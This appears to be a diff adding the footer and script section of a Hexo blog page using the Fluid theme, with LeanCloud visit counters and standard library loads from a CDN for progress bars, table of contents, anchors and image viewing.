+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客量 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
